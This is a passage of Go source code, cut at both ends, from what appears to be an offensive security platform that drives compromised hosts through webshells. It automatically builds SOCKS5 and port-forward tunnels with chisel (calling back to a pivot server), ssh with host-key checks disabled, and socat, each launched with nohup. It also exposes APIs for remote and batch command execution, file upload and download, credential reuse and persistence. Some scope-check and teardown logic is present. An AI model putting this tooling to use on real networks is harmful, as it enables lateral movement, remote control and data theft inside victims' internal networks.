			reason = "目标有 chisel，用 chisel client 建 SOCKS5（目标监听 " + strconv.Itoa(listenPort) + "）"
		} else if intranetHasBin(info, "ssh") {
			if pivotErr != nil {
				return "", pivotErr.Error()
			}
			deploy = fmt.Sprintf("nohup ssh -N -D 0.0.0.0:%d -p %d -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
				listenPort, pivotPort, shQuote(pivotHost), tunnelID)
			reason = "目标有 ssh，用 ssh -D 建 SOCKS5（目标监听 " + strconv.Itoa(listenPort) + "）"
		} else {
			return "", "目标上没有 chisel/ssh，无法自动建 SOCKS5；请手动提供 deploy_command"
		}
		return deploy, reason

	case db.IntranetTunnelKindPort, db.IntranetTunnelKindRemote:
		// 端口转发：socat > ssh -L > chisel
		if remoteHost == "" || remotePort <= 0 || listenPort <= 0 {
			return "", "需要 listen_port、remote_host 与 remote_port"
		}
		if intranetHasBin(info, "socat") {
			listen := "TCP-LISTEN:" + strconv.Itoa(listenPort)
			if h := strings.TrimSpace(t.ListenHost); h != "" && h != "0.0.0.0" && h != "::" {
				listen += ",bind=" + h
			}
			listen += ",fork,reuseaddr"
			base := "socat " + listen + " TCP:" + intranetHostPort(remoteHost, remotePort)
			deploy = "nohup " + base + " </dev/null >/tmp/jw_tunnel_" + tunnelID + ".log 2>&1 & echo JW_PID:$!"
			reason = "目标有 socat，用 socat 做端口转发"
		} else if intranetHasBin(info, "ssh") {
			if pivotErr != nil {
				return "", pivotErr.Error()
			}
			deploy = fmt.Sprintf("nohup ssh -N -L %d:%s:%d -p %d -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
				listenPort, remoteHost, remotePort, pivotPort, shQuote(pivotHost), tunnelID)
			reason = "目标没有 socat，用 ssh -L 做端口转发"
		} else if intranetHasBin(info, "chisel") {
			if pivotErr != nil {
				return "", pivotErr.Error()
			}
			pivot, _ := intranetPivotEndpoint()
			spec := fmt.Sprintf("%d:%s:%d", listenPort, remoteHost, remotePort)
			if kind == db.IntranetTunnelKindRemote {
				spec = "R:" + spec
			}
			deploy = fmt.Sprintf("nohup chisel client --fingerprint auto %s %s </dev/null >/tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
				shQuote(pivot), spec, tunnelID)
			reason = "目标没有 socat/ssh，用 chisel 做端口转发"
		} else {
			return "", "目标上没有 socat/ssh/chisel，无法自动生成转发命令；请手动提供 deploy_command"
		}
		return deploy, reason
	}
	return "", "不支持的隧道类型: " + kind
}

func intranetVerifyCommand(port int) string {
	return "(ss -lnt 2>/dev/null || netstat -lnt 2>/dev/null) | grep -qE '[:.]" + strconv.Itoa(port) + "[[:space:]]' && echo JW_TUNNEL_OK || echo JW_TUNNEL_FAIL"
}

func intranetKillCommand(pid int) string {
	if pid <= 0 {
		return ""
	}
	return "kill " + strconv.Itoa(pid) + " 2>/dev/null; sleep 1; kill -9 " + strconv.Itoa(pid) + " 2>/dev/null || true"
}

func (s *Server) intranetPlanTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel, deploy, verify, teardown string) (*db.IntranetTunnel, intranetProbeInfo, error) {
	if t.SessionID == nil || *t.SessionID <= 0 {
		return nil, intranetProbeInfo{}, errors.New("隧道未绑定会话，无法探测目标环境")
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		return nil, intranetProbeInfo{}, err
	}
	info, out := s.intranetProbe(ctx, pg, sess)
	if out.IsError && strings.TrimSpace(info.Raw) == "" {
		return nil, info, errors.New("探测失败: " + displayOr(out.Note, "无回显"))
	}
	deploy = strings.TrimSpace(deploy)
	verify = strings.TrimSpace(verify)
	teardown = strings.TrimSpace(teardown)
	if deploy == "" {
		deploy = strings.TrimSpace(t.DeployCommand)
	}
	if verify == "" {
		verify = strings.TrimSpace(t.VerifyCommand)
	}
	if teardown == "" {
		teardown = strings.TrimSpace(t.TeardownCommand)
	}
	if deploy == "" {
		// 隧道自动选型：根据目标上可用的工具自动选择最佳部署命令
		autoDeploy, reason := autoSelectTunnelCommand(t.Kind, info, t)
		if autoDeploy == "" {
			return nil, info, errors.New(reason)
		}
		deploy = autoDeploy
		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel",
			"自动选型："+reason, autoDeploy, false)
	}
	if verify == "" {
		if t.ListenPort > 0 {
			verify = intranetVerifyCommand(t.ListenPort)
		} else {
			verify = "echo JW_TUNNEL_OK"
		}
	}
	evidence := "【环境探测】\n" + strings.TrimSpace(info.Raw)
	updated, err := pg.UpdateIntranetTunnelPlan(t.ID, deploy, verify, teardown, evidence)
	if err != nil {
		return nil, info, err
	}
	if evidence != "" {
		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "规划隧道 #"+strconv.FormatInt(t.ID, 10)+"\n"+deploy, truncateIntranetOutput(evidence, 4000), false)
	}
	return updated, info, nil
}

var reIntranetPID = regexp.MustCompile(`JW_PID:(\d+)`)

func (s *Server) intranetDeployTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel, ttl time.Duration) (*db.IntranetTunnel, intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	if t.Status == db.IntranetTunnelStopped {
		return nil, out, errors.New("隧道已停止，请重新规划后再部署")
	}
	if t.SessionID == nil || *t.SessionID <= 0 {
		return nil, out, errors.New("隧道未绑定会话")
	}
	if t.TaskID != nil {
		if reason, allowed := s.intranetTargetAllowed(pg, *t.TaskID, t.RemoteHost); !allowed {
			return nil, out, errors.New(reason)
		}
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		return nil, out, err
	}
	if strings.TrimSpace(t.DeployCommand) == "" {
		t, _, err = s.intranetPlanTunnel(ctx, pg, t, "", "", "")
		if err != nil {
			return nil, out, err
		}
	}
	out = s.intranetRun(ctx, pg, sess, t.DeployCommand, 60*time.Second)
	pid := 0
	if m := reIntranetPID.FindStringSubmatch(out.Output); len(m) == 2 {
		pid, _ = strconv.Atoi(m[1])
	}
	teardown := strings.TrimSpace(t.TeardownCommand)
	if teardown == "" {
		teardown = intranetKillCommand(pid)
	}
	if teardown != "" {
		t, _ = pg.UpdateIntranetTunnelPlan(t.ID, "", "", teardown, "")
	}
	evidence := strings.TrimSpace(out.Output)
	if out.IsError {
		evidence = "部署失败: " + displayOr(out.Note, evidence)
	}
	status := db.IntranetTunnelDeployed
	if out.IsError {
		status = db.IntranetTunnelFailed
	}
	updated, err := pg.SetIntranetTunnelStatus(t.ID, status, pid, truncateIntranetOutput(evidence, 4000), "")
	if err != nil {
		return nil, out, err
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "部署隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), out.IsError)
	if status == db.IntranetTunnelDeployed && s.resourceMgr != nil {
		if ttl <= 0 || ttl > intranetTunnelMaxTTL {
			ttl = intranetTunnelTTL
		}
		expires := time.Now().Add(ttl)
		tunnelID := updated.ID
		meta := map[string]any{"tunnel_id": tunnelID, "session_id": sess.ID}
		if pid > 0 {
			meta["pid"] = pid
		}
		cleanup := func(cctx context.Context) {
			c, cancel := context.WithTimeout(cctx, 30*time.Second)
			defer cancel()
			s.intranetStopTunnel(c, tunnelID, "受管资源到期/释放，自动拆除隧道")
		}
		if _, rerr := s.resourceMgr.register(db.ManagedResourceInput{
			Kind:      db.ManagedKindTunnel,
			Name:      updated.Name,
			Endpoint:  fmt.Sprintf("session:%d %s -> %s", sess.ID, intranetHostPort(updated.ListenHost, updated.ListenPort), intranetHostPort(updated.RemoteHost, updated.RemotePort)),
			Target:    updated.RemoteHost,
			Owner:     "intranet",
			TaskID:    updated.TaskID,
			ExpiresAt: &expires,
			Metadata:  meta,
			Note:      "内网隧道，到期或任务结束自动回收",
		}, cleanup); rerr != nil {
			log.Printf("[intranet] 隧道 #%d 登记受管资源失败: %v", updated.ID, rerr)
		}
	}
	return updated, out, nil
}

func (s *Server) intranetVerifyTunnel(ctx context.Context, pg *db.DB, t *db.IntranetTunnel) (*db.IntranetTunnel, intranetExecOutcome, error) {
	out := intranetExecOutcome{ExitCode: -1}
	if t.SessionID == nil || *t.SessionID <= 0 {
		return nil, out, errors.New("隧道未绑定会话")
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		return nil, out, err
	}
	cmd := strings.TrimSpace(t.VerifyCommand)
	if cmd == "" {
		cmd = intranetVerifyCommand(t.ListenPort)
	}
	out = s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
	ok := !out.IsError && !strings.Contains(out.Output, "JW_TUNNEL_FAIL")
	status := db.IntranetTunnelFailed
	if ok {
		status = db.IntranetTunnelVerified
	}
	evidence := strings.TrimSpace(out.Output)
	if out.Note != "" {
		evidence += "\n" + out.Note
	}
	updated, err := pg.SetIntranetTunnelStatus(t.ID, status, 0, truncateIntranetOutput(evidence, 4000), "")
	if err != nil {
		return nil, out, err
	}
	_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "验证隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), !ok)
	return updated, out, nil
}

// intranetTunnelAccess explains how to reach a live tunnel. The listener sits on
// the target, so a wildcard bind is addressed through the session host; a
// loopback bind is only usable from inside the target.
func (s *Server) intranetTunnelAccess(pg *db.DB, t *db.IntranetTunnel) map[string]any {
	if t == nil || t.ListenPort <= 0 {
		return nil
	}
	if t.Status != db.IntranetTunnelDeployed && t.Status != db.IntranetTunnelVerified {
		return nil
	}
	host := strings.TrimSpace(t.ListenHost)
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = ""
		if t.SessionID != nil && *t.SessionID > 0 {
			if sess, err := pg.GetIntranetSession(*t.SessionID); err == nil {
				host = intranetHost(sess.Host)
				if host == "" {
					host = intranetHost(sess.WebshellURL)
				}
			}
		}
		if host == "" {
			return map[string]any{"note": "监听在目标所有地址，请用目标主机地址访问端口 " + strconv.Itoa(t.ListenPort)}
		}
	} else if ip := net.ParseIP(host); ip != nil && ip.IsLoopback() {
		return map[string]any{
			"loopback_only": true,
			"note":          "监听在目标回环地址，只能从目标内部访问；如需平台直连，请把 listen_host 改为 0.0.0.0（或目标内网地址）后重新部署",
		}
	}
	endpoint := intranetHostPort(host, t.ListenPort)
	access := map[string]any{"host": host, "port": t.ListenPort, "target": endpoint}
	switch t.Kind {
	case db.IntranetTunnelKindSocks5:
		access["proxy"] = "socks5://" + endpoint
		access["note"] = "把该代理配置给扫描/深度任务即可经目标出站访问内网"
	case db.IntranetTunnelKindRemote:
		if ph, _, perr := intranetPivotServer(); perr == nil {
			access["endpoint"] = intranetHostPort(ph, t.ListenPort)
			access["note"] = "反向转发：监听端在控制端，目标主动连出"
		} else {
			access["note"] = perr.Error()
		}
	default:
		access["endpoint"] = endpoint
	}
	return access
}

// intranetStopTunnel is the idempotent teardown used by the API and by the
// managed-resource cleanup closure. It never calls the resource manager, so the
// two paths cannot recurse.
func (s *Server) intranetStopTunnel(ctx context.Context, tunnelID int64, note string) {
	pg := s.m.pg
	if pg == nil {
		return
	}
	t, err := pg.GetIntranetTunnel(tunnelID)
	if err != nil || t == nil {
		return
	}
	if t.Status == db.IntranetTunnelStopped {
		return
	}
	evidence := ""
	if t.SessionID != nil && *t.SessionID > 0 {
		if sess, err := s.intranetSession(pg, *t.SessionID); err == nil {
			cmd := strings.TrimSpace(t.TeardownCommand)
			if cmd == "" {
				cmd = intranetKillCommand(ptrInt(t.PID))
			}
			if cmd != "" {
				out := s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
				evidence = strings.TrimSpace(out.Output)
				if out.Note != "" {
					evidence += "\n" + out.Note
				}
				_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel", "拆除隧道 #"+strconv.FormatInt(t.ID, 10), truncateIntranetOutput(evidence, 4000), out.IsError)
			}
		}
	}
	note = strings.TrimSpace(note)
	if note == "" {
		note = "手动拆除"
	}
	_, _ = pg.SetIntranetTunnelStatus(t.ID, db.IntranetTunnelStopped, 0, truncateIntranetOutput(evidence, 4000), note)
	_ = pg.ReleaseManagedResourceByTunnel(t.ID, note)
}

func ptrInt(v *int) int {
	if v == nil {
		return 0
	}
	return *v
}

// ---------------------------------------------------------------------------
// HTTP API
// ---------------------------------------------------------------------------

type intranetSessionDTO struct {
	Name       string         `json:"name"`
	WebshellID int64          `json:"webshell_id"`
	TaskID     int64          `json:"task_id"`
	Host       string         `json:"host"`
	Cwd        string         `json:"cwd"`
	Note       string         `json:"note"`
	Metadata   map[string]any `json:"metadata"`
	Status     string         `json:"status"`
}

type intranetTunnelDTO struct {
	Name            string `json:"name"`
	SessionID       int64  `json:"session_id"`
	TaskID          int64  `json:"task_id"`
	Kind            string `json:"kind"`
	ListenHost      string `json:"listen_host"`
	ListenPort      int    `json:"listen_port"`
	RemoteHost      string `json:"remote_host"`
	RemotePort      int    `json:"remote_port"`
	DeployCommand   string `json:"deploy_command"`
	VerifyCommand   string `json:"verify_command"`
	TeardownCommand string `json:"teardown_command"`
	Note            string `json:"note"`
}

type intranetTunnelActionDTO struct {
	DeployCommand   string `json:"deploy_command"`
	VerifyCommand   string `json:"verify_command"`
	TeardownCommand string `json:"teardown_command"`
	TTLSeconds      int    `json:"ttl_seconds"`
	TimeoutSeconds  int    `json:"timeout_seconds"`
}

type intranetHandoffDTO struct {
	FromTaskID  int64   `json:"from_task_id"`
	Name        string  `json:"name"`
	Description string  `json:"description"`
	Goal        string  `json:"goal"`
	SessionIDs  []int64 `json:"session_ids"`
	TunnelIDs   []int64 `json:"tunnel_ids"`
}

func (s *Server) registerIntranet(mux *http.ServeMux) {
	mux.HandleFunc("GET /api/intranet/sessions", s.listIntranetSessions)
	mux.HandleFunc("POST /api/intranet/sessions", s.createIntranetSession)
	mux.HandleFunc("GET /api/intranet/sessions/{id}", s.getIntranetSession)
	mux.HandleFunc("PATCH /api/intranet/sessions/{id}", s.updateIntranetSession)
	mux.HandleFunc("DELETE /api/intranet/sessions/{id}", s.deleteIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/exec", s.execIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/upload", s.uploadIntranetFile)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/download", s.downloadIntranetFile)
	mux.HandleFunc("GET /api/intranet/sessions/{id}/events", s.listIntranetSessionEvents)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/recon", s.reconIntranetSession)
	mux.HandleFunc("POST /api/intranet/sessions/batch-exec", s.batchExecIntranetSessions)

	mux.HandleFunc("GET /api/intranet/credentials", s.listIntranetCredentials)
	mux.HandleFunc("POST /api/intranet/credentials/reuse", s.reuseIntranetCredential)

	mux.HandleFunc("GET /api/intranet/artifacts", s.listIntranetArtifacts)
	mux.HandleFunc("POST /api/intranet/artifacts", s.registerIntranetArtifact)
	mux.HandleFunc("POST /api/intranet/artifacts/{id}/revoke", s.revokeIntranetArtifact)
	mux.HandleFunc("POST /api/intranet/sessions/{id}/persist", s.persistIntranetSession)
	mux.HandleFunc("POST /api/intranet/evacuate", s.evacuateIntranetTask)

	mux.HandleFunc("GET /api/intranet/tunnels", s.listIntranetTunnels)
	mux.HandleFunc("POST /api/intranet/tunnels", s.createIntranetTunnel)
	mux.HandleFunc("GET /api/intranet/tunnels/{id}", s.getIntranetTunnel)
	mux.HandleFunc("DELETE /api/intranet/tunnels/{id}", s.deleteIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/probe", s.probeIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/plan", s.planIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/deploy", s.deployIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/verify", s.verifyIntranetTunnel)
	mux.HandleFunc("POST /api/intranet/tunnels/{id}/teardown", s.teardownIntranetTunnel)

	mux.HandleFunc("GET /api/intranet/scope-requests", s.listIntranetScopeRequests)
	mux.HandleFunc("POST /api/intranet/scope-requests", s.createIntranetScopeRequest)
	mux.HandleFunc("POST /api/intranet/scope-requests/{id}/approve", s.approveIntranetScopeRequest)
	mux.HandleFunc("POST /api/intranet/scope-requests/{id}/reject", s.rejectIntranetScopeRequest)
	mux.HandleFunc("POST /api/intranet/handoff", s.handoffIntranetTask)
}

func (s *Server) listIntranetSessions(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	sessions, total, err := pg.ListIntranetSessions(q.Get("status"), taskID, atoiDefault(q.Get("limit"), 100), atoiDefault(q.Get("offset"), 0))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"sessions": sessions, "total": total})
}

func (s *Server) createIntranetSession(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetSessionDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	shell, err := pg.GetWebshell(req.WebshellID)
	if err != nil {
		writeErr(w, 400, "webshell 不存在")
		return
	}
	if strings.TrimSpace(shell.URL) == "" {
		writeErr(w, 400, "该 webshell 没有可用地址")
		return
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
		return
	}
	host := intranetHost(req.Host)
	if host == "" {
		host = intranetHost(shell.Target)
	}
	if host == "" {
		host = intranetHost(shell.URL)
	}
	sess, err := pg.CreateIntranetSession(db.IntranetSessionInput{
		Name: req.Name, WebshellID: req.WebshellID, TaskID: req.TaskID,
		Host: host, Cwd: req.Cwd, Note: req.Note, Metadata: req.Metadata,
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	info, out := s.intranetProbe(r.Context(), pg, sess)
	if out.IsError {
		log.Printf("[intranet] 会话 #%d 初始探测失败: %s", sess.ID, displayOr(out.Note, strings.TrimSpace(out.Output)))
	}
	writeJSON(w, 200, map[string]any{"session": sess, "probe": info, "probe_error": out.Note})
}

func (s *Server) getIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := pg.GetIntranetSession(id)
	if err != nil {
		writeErr(w, 404, "会话不存在")
		return
	}
	events, _ := pg.ListIntranetSessionEvents(id, atoiDefault(r.URL.Query().Get("events"), 100))
	writeJSON(w, 200, map[string]any{"session": sess, "events": events})
}

func (s *Server) updateIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetSessionDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	status := strings.ToLower(strings.TrimSpace(req.Status))
	if status != "" && status != db.IntranetSessionActive && status != db.IntranetSessionClosed {
		writeErr(w, 400, "status 必须是 active 或 closed")
		return
	}
	sess, err := pg.UpdateIntranetSessionState(id, strings.TrimSpace(req.Cwd), status, strings.TrimSpace(req.Note))
	if err != nil {
		writeErr(w, 404, "会话不存在")
		return
	}
	if req.TaskID > 0 {
		_ = pg.SetIntranetSessionTask(id, req.TaskID)
		sess.TaskID = &req.TaskID
	}
	writeJSON(w, 200, map[string]any{"session": sess})
}

func (s *Server) deleteIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	deleted, err := pg.DeleteIntranetSession(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if !deleted {
		writeErr(w, 404, "会话不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

func (s *Server) execIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Command        string `json:"command"`
		TimeoutSeconds int    `json:"timeout_seconds"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := s.intranetSession(pg, id)
	if err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	timeout := time.Duration(req.TimeoutSeconds) * time.Second
	if timeout <= 0 || timeout > 300*time.Second {
		timeout = intranetExecTimeout
	}
	out := s.intranetExec(r.Context(), pg, sess, req.Command, timeout)
	writeJSON(w, 200, map[string]any{"result": out, "session": sess})
}

func (s *Server) uploadIntranetFile(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 8<<20)
	var req struct {
		Path          string `json:"path"`
		ContentBase64 string `json:"content_base64"`
		Content       string `json:"content"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	payload := req.ContentBase64
	if strings.TrimSpace(payload) == "" && req.Content != "" {
		payload = base64.StdEncoding.EncodeToString([]byte(req.Content))
	}
	data, err := base64.StdEncoding.DecodeString(strings.TrimSpace(payload))
	if err != nil {
		writeErr(w, 400, "content_base64 无效")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := s.intranetSession(pg, id)
	if err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	out, err := s.intranetUpload(r.Context(), pg, sess, req.Path, data)
	code := 200
	if err != nil {
		code = 400
	}
	writeJSON(w, code, map[string]any{"result": out, "session": sess})
}

func (s *Server) downloadIntranetFile(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Path     string `json:"path"`
		MaxBytes int    `json:"max_bytes"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	sess, err := s.intranetSession(pg, id)
	if err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	data, total, truncated, out := s.intranetDownload(r.Context(), pg, sess, req.Path, req.MaxBytes)
	code := 200
	if out.IsError {
		code = 400
	}
	writeJSON(w, code, map[string]any{
		"result": out, "size": len(data), "total": total, "truncated": truncated,
		"content_base64": base64.StdEncoding.EncodeToString(data), "session": sess,
	})
}

func (s *Server) listIntranetSessionEvents(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	events, err := pg.ListIntranetSessionEvents(id, atoiDefault(r.URL.Query().Get("limit"), 100))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"events": events})
}

func (s *Server) batchExecIntranetSessions(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		SessionIDs     []int64 `json:"session_ids"`
		TaskID         int64   `json:"task_id"`
		Command        string  `json:"command"`
		TimeoutSeconds int     `json:"timeout_seconds"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	timeout := time.Duration(req.TimeoutSeconds) * time.Second
	if timeout <= 0 || timeout > 180*time.Second {
		timeout = intranetExecTimeout
	}
	results, err := s.intranetBatchExec(r.Context(), pg, req.SessionIDs, req.TaskID, req.Command, timeout)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"results": results, "total": len(results)})
}

type intranetBatchItem struct {
	SessionID int64               `json:"session_id"`
	Name      string              `json:"name"`
	Result    intranetExecOutcome `json:"result"`
	Error     string              `json:"error,omitempty"`
}

func (s *Server) intranetBatchExec(ctx context.Context, pg *db.DB, sessionIDs []int64, taskID int64, command string, timeout time.Duration) ([]intranetBatchItem, error) {
	ids := sessionIDs
	if len(ids) == 0 && taskID > 0 {
		sessions, _, err := pg.ListIntranetSessions(db.IntranetSessionActive, taskID, 500, 0)
		if err != nil {
			return nil, err
		}
		for _, sess := range sessions {
			ids = append(ids, sess.ID)
		}
	}
	if len(ids) == 0 {
		return nil, errors.New("需要 session_ids 或 task_id")
	}
	if len(ids) > intranetBatchLimit {
		ids = ids[:intranetBatchLimit]
	}
	if timeout <= 0 {
		timeout = intranetExecTimeout
	}
	results := make([]intranetBatchItem, 0, len(ids))
	for _, sid := range ids {
		item := intranetBatchItem{SessionID: sid}
		sess, err := s.intranetSession(pg, sid)
		if err != nil {
			item.Error = err.Error()
			results = append(results, item)
			continue
		}
		item.Name = sess.Name
		item.Result = s.intranetExec(ctx, pg, sess, command, timeout)
		results = append(results, item)
	}
	return results, nil
}

func (s *Server) resolveIntranetTunnelTask(pg *db.DB, in *db.IntranetTunnelInput) {
	if in.TaskID > 0 || in.SessionID <= 0 {
		return
	}
	if sess, err := pg.GetIntranetSession(in.SessionID); err == nil && sess.TaskID != nil {
		in.TaskID = *sess.TaskID
	}
}

func (s *Server) createIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetTunnelDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	kind := strings.ToLower(strings.TrimSpace(req.Kind))
	if kind == "" {
		kind = db.IntranetTunnelKindPort
	}
	if req.ListenPort < 1 || req.ListenPort > 65535 {
		writeErr(w, 400, "listen_port 必须在 1-65535 之间")
		return
	}
	if kind != db.IntranetTunnelKindSocks5 && (req.RemotePort < 1 || req.RemotePort > 65535) {
		writeErr(w, 400, "remote_port 必须在 1-65535 之间")
		return
	}
	in := db.IntranetTunnelInput{
		Name: req.Name, SessionID: req.SessionID, TaskID: req.TaskID, Kind: kind,
		ListenHost: req.ListenHost, ListenPort: req.ListenPort,
		RemoteHost: intranetHost(req.RemoteHost), RemotePort: req.RemotePort,
		DeployCommand: req.DeployCommand, VerifyCommand: req.VerifyCommand,
		TeardownCommand: req.TeardownCommand, Note: req.Note,
	}
	if in.SessionID > 0 {
		if _, err := s.intranetSession(pg, in.SessionID); err != nil {
			writeErr(w, 400, err.Error())
			return
		}
	}
	s.resolveIntranetTunnelTask(pg, &in)
	if reason, allowed := shellAllowed(pg, in.RemoteHost); !allowed {
		writeErr(w, 400, "目标命中资产拦截规则："+reason)
		return
	}
	t, err := pg.CreateIntranetTunnel(in)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": t})
}

func (s *Server) listIntranetTunnels(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	sessionID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("session_id")), 10, 64)
	tunnels, total, err := pg.ListIntranetTunnels(q.Get("status"), taskID, sessionID, atoiDefault(q.Get("limit"), 100), atoiDefault(q.Get("offset"), 0))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tunnels": tunnels, "total": total})
}

func (s *Server) getIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的隧道 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	t, err := pg.GetIntranetTunnel(id)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": t, "access": s.intranetTunnelAccess(pg, t)})
}

func (s *Server) deleteIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的隧道 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	t, err := pg.GetIntranetTunnel(id)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return
	}
	if t.Status != db.IntranetTunnelStopped {
		if s.resourceMgr != nil {
			if res, _ := pg.FindActiveManagedResourceByTunnel(id); res != nil {
				_, _ = s.resourceMgr.release(r.Context(), res.ID, "隧道已删除")
			} else {
				s.intranetStopTunnel(r.Context(), id, "隧道已删除")
			}
		} else {
			s.intranetStopTunnel(r.Context(), id, "隧道已删除")
		}
	}
	deleted, err := pg.DeleteIntranetTunnel(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": deleted})
}

func (s *Server) intranetTunnelFromRequest(w http.ResponseWriter, r *http.Request) (*db.DB, *db.IntranetTunnel, bool) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的隧道 ID")
		return nil, nil, false
	}
